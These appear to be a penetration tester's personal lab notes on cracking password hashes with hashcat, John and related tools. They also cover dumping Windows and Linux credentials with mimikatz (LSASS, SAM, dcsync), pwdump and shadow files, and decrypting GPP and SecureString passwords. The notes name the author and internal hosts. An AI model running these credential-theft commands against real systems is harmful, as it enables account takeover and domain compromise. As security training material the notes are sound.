
# Password Cracking

**Hash Cracking various hash types without hashcat**

Hash cracking site: https://crackstation.net/

**MD5 ONLY**
* worked for an md5 hash on a wordpress sql dp tables
> https://md5.gromweb.com

## Hashcat
* use my main desktop machine as the cracking machine(oak-ws01) 10.10.40.2 and on  C:\Users\steven.bracamonte\Desktop\hashcat-5.1.0
* download hashcat binary from https://hashcat.net/hashcat/ and 7zip unzip it. simply cd into it and run the PE below(hashcat64.exe)
* it will find my one gpu card and use that wit the supplied params. use winscp to send files over for the cracking 
* find hash switch types to use here https://hashcat.net/wiki/doku.php?id=example_hashes
* -m is for hash type to attack
* --show will display discovered hashes
* "--show  --outfile-format 2"   displays only username:password and omits the hash for easy display and format for combo-creds list

**MD5 hashes**
* enter the hashes in a simple list
> .\hashcat64.exe -m 0 --show .\md5-hmailserver.txt .\rockyou.txt

**NTLM Hashes**
* put ntlm hashes recoverd from jollykatz dumps into one txt file in form "username:hash" and run hashcat with the --username option
> .\hashcat64.exe -m 1000  --username --show .\ntlm-hashes.txt .\rockyou.txt

* LM/Ntlm hashes from pwdump ie; "admin:1007:A46139FEAAF2B9F117306D272A9441BB:C5E0002FDE3F5EB2CF5730FFEE58EBCC:::" also work

>  .\hashcat64.exe -m 1000 --username --status .\ntlm-hashes-jd.txt .\rockyou.txt

**MSSQL 2000 hashes**
* dumped from nmap script or otherwise
* hash format: user1:0x010075269655FB8564B8DD8B71309952A44ABC5CFD96924EA67AFB8564B8DD8B71309952A44ABC5CFD96924EA65r
* don't use WORDWRAP! and align perfectly in notepad one user:hash per line

> .\hashcat64.exe -m 131  --username  .\user-mssql-hashes.txt .\rockyou.txt

> .\hashcat64.exe -m 131  --username --show .\user-mssql-hashes.txt .\rockyou.txt

**krb5 hashes**
> .\hashcat64.exe -m 13100 C:\Users\steven.bracamonte\Desktop\hash.txt C:\Users
\steven.bracamonte\Desktop\rockyou.txt --force --potfile-disable

**keepass hashes**
* has keepass db file with john and save to file 
> keepass2john CEH.kdbx > keepass.txt

* use hashcat to crack the file with the hash
>  .\hashcat64.exe -m 13400 ..\keepass.txt ..\rockyou.txt

* once captured you can launch keepass2 to read the db

**Wordpress hashes**
* make sure the txt file with the hash saves as an ANSII file if you see BOM erorr
* this will crack them in either salted or not salted formats ie; \\$P\\$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1
>  .\hashcat64.exe -m 400 --show .\wphash.txt .\rockyou.txt

**Sha 512 Shadow hashes \\$6\\$**
    * $6$n2qucJiy$IJB7xjSOIp4a1BEzXfArpbWucFwIpnRyIQZCEMCI07B5.Ts5304yIRKE3CEdhfNCwuBl0CHv/qWDF1YrCmEjT1

> .\hashcat64.exe -m 1800 --status .\shadow-sha512-hashes.txt .\rockyou.txt

**MD5 Shadow Hashes \\$1\$**
    * $1$UzPvwaR7$AAo12TQaGMXmU5EirJazF.
    
    * $1$2xFdVkZ.$qezz2fIJmpMkAX8QaNt/h/
    
* hashes only in txt file
>  .\hashcat64.exe -m 500 --status .\md5-Shadow-hashes.txt .\rockyou.txt

* Passing the unshadowed.txt file generated with John to match to usernames

    
> unshadow passwd shadow > unshadowed.txt

> .\hashcat64.exe -m 500 --username --show .\md5shadow.txt .\rockyou.txt

* Outputting text for combo-creds list

> .\hashcat64.exe -m 500 --username --show  --outfile-format 2 .\md5shadow.txt .\rockyou.txt

## John

**Cracking any hash**
* John can identify most hashes on it's own just put the hash(s) in a txt file and feed it in
> john --rules --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <ENTER HASH FILE HERE\>

**passwd/shadow hashes**
* first get the passwd and shadow file downloaded from target and create an unshadowed file from them
    > unshadow passwd shadow > unshadowed.txt
* second run a dictionary list from the leaked databases and match from something
    > john --rules --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt unshadowed.txt
* display matched passwords stored in Johns DB by running this against the unshadowed.txt file
    > john --show unshadowed.txt
* Using the john.py script to run an unshadowed file against all the rockyou password lists
    > source activate pentest
    > python3 john.py '/usr/share/seclists/Passwords/Leaked-Databases/' '/root/oscp-hosts/barry/unshadowed.txt'
    
* Display only discovered passwords
> john --show unshadowed.txt | cut -d ":" -f 2
    
    
**SSH-RSA/DSA encrypted keys**
* crack RSA ssh keys with john
* first put encrypted rsa key in johns cracking format
> ssh2john id_rsa > id_rsa.hash

* crack against a list
> john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash

* enter ssh id_rsa key with passphrase

> ssh -i id_rsa takis@10.10.10.10

**WinRAR Hashes**
* use when you find a password protected .rar files

> rar2john Executives.rar > rar.hash

> john -wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ./rar.hash

* type this when it's complete to see what was found

> john ./rar.hash --show

**Creating a quick wordlist**
* creates a wordlist from an input of terms 
> john --wordlist=mariobros.lst --rules --stdout 

## fcrackzip
* use to brute force password protected zip files

> fcrackzip -u -D -p "/usr/share/john/password.lst" ./accounting.zip

## PS SecureStrings
* basically decrypt encrypted windows passwords encrypted with the convertFrom-secureString function back into Plain text
* https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/
* used to encrypt a password and leave in a script to run. Can only be decrypted by same user.

* Encrypted password
> $pass = "P@ssword1" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString
    * 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000adfbb072b9e43f45bb7ce01f148762130000000002000000000003660000c00000001000
000030dc7d2f23848eaca7c419a3e9c1e5e10000000004800000a0000000100000009dcf9dd0228b119cd4f5984250563034180000008c6a3b0fd112
766f4058dab26e65cf35d9e3f66b60d8f67f14000000340601f7e72f6b4f1a194debac5d6ff5f53e774d



* decrypt the password
       works on any scripts regardless if user exists or if it's a legit cred

> \\$passSecure = $pass | ConvertTo-SecureString

> \$user = sbracamonte 

> \\$cred = New-Object System.Management.Automation.PSCredential(\\$user,$passSecure)

> \$cred.GetNetworkCredential()|fl
    * UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB



## GPP/Cpassword hashes
* Group Policy Preferences feature used in AD environments
* groups.xml file is what we are after that sets up a user and hash readable by domain joined machines normally
* http://obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html 
* download the files captured using smbserver.py to a windows box and crack with powershell module
+ Windows Pentest Box: LB-VDT-09 192.168.1.148 
* https://pentestlab.blog/tag/cpassword/


### Powershell Script

**Powershell from Windows Pentest Box > Login with my domain creds**
> root@kali:~# ./LB-VDT-09.sh

From here open powershell ISE or powershell and just run the files on my desktop ie:

> PS C:\Users\steven.bracamonte\Desktop> .\get-cpass.ps1 .\Groups.xml

    UserName                      NewName                       Password                    
    --------                      -------                       --------                    
    contoso.com\SVC_TGS                                          passWORd!  

**Powershell From Linux installation**
> root@kali:~/HTB/hosts/Active# pwsh get-cpass.ps1 Groups.xml 

    UserName           NewName Password
    --------           ------- --------
    Contoso.com\SVC_TGS         passWORD!

### gppdecrypt
* supply the cpassword string directly
https://tools.kali.org/password-attacks/gpp-decrypt

>  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

    /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated

    passWORD!

#### Read .pol file
https://github.com/PowerShell/GPRegistryPolicy

* use win desktop pen testing machine and the command: 

> Parse-PolFile -Path "C:\temp\Registry.pol"

### Word Mangling/password list
    set mangling options in /etc/john/john.conf

**Using default wordlist mangle params on a given list of words**
> john --wordlist=wordlist-mischief.txt --rules --stdout > mutated2.txt

# Post Root
    https://blog.ropnop.com/transferring-files-from-kali-to-windows/

## Dump LM/NTLM Hashes from Windows
**fgdump.exe** 
* 
* upload to box and run get output and use crackstation to crack the hashes
* Needs to run with user creds supplied

**PwDump.exe**
* use this on win 2000 boxes. seems to work on the legacy stuff.
* dumps SAM hashes for cracking
> .\PwDump.exe LocalHost

> .\pwdump.exe -u walter -p P@ssWORD1234 localhost

**MimiKatz**

* http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale-2.html
* use jollykatz32.exe if you see an error about a missing DLL when using 64 bit version
* TIP: use a .bat script to avoid running all these commands and collect the data in a .txt file for exfiltration

* dump clear-text passwords from LSASS process:
 
> C:\> mimikatz32.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

* Steal users credentials until they reset their passwords:
 > C:\> mimikatz32.exe "privilege::debug" "sekurlsa::ekeys" "exit"


* Dump LM and NTLM hashes from SAM:
>  C:\> mimikatz32.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

* read SAM file from /repair or ntbackup files:
  
> C:\> reg save HKLM\SYSTEM SystemBkup.hiv

> C:\> reg save HKLM\SAM SamBkup.hiv

(Or use Volume Shadow Copy / BootCD to backup these files or get them from the repair folder

> C:\Windows\System32\config\SYSTEM

> C:\Windows\System32\config\SAM

> C:\> mimikatz32.exe "lsadump::sam SystemBkup.hiv SamBkup.hiv" "exit"

### NTDS.dit 
* on a domain controller you can dump this using domain admin creds and get all user hashes
> mimikatz.exe "lsadump::dcsync /domain:thinc.local /all /csv" "exit" >> mimi.txt

## Unix Passwd/Shadow cracking
###### Tool like mimikatz for Linux
    https://github.com/huntergregal/mimipenguin
    
###### Creating a Sudo user
    https://www.shellhacks.com/how-to-grant-root-access-user-root-privileges-linux/
    useradd >>>> if this is not a found command try and use "locate" to find it's binary path and run it that way
##### Decrypt linux shadow hashed files
> unshadow passwd shadow > unshadowed.txt

> john --rules --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt unshadowed.txt
    
   Use my /root/john.py in the passwords notebook to run multiple lists in a directory against the unshadowed.txt file
 ###### After cracking against several lists Display the discovered passwords with this as john keeps a database of the cracked passwords
    john --show unshadowed.txt
    

**Hashcat cracking method on Windows10 a pentest box**
* take the hashes from the shadow file and just copy them into txt file to pass to hashcat
* use --show option instead of status to see what was cracked ie; *  
    * root:\\$6\\$n2qucJiy\\$IJB7xjSOIp4a1BEzXfArpbWucFwIpnRyIQZCEMCI07B5.Ts5304yIRKE3CEdhfNCwuBl0CHv/qWDF1YrCmEjT1:16902:0:99999:7:::
            $6$n2qucJiy$IJB7xjSOIp4a1BEzXfArpbWucFwIpnRyIQZCEMCI07B5.Ts5304yIRKE3CEdhfNCwuBl0CHv/qWDF1YrCmEjT1 ---------------JUST NEED THIS
* verify the hash type by looking "/etc/login.defs" on the nix box

**Executing hashcat from windows**
>  .\hashcat64.exe -m 1800 --status .\shadow-sha512-hashes.txt .\rockyou.txt
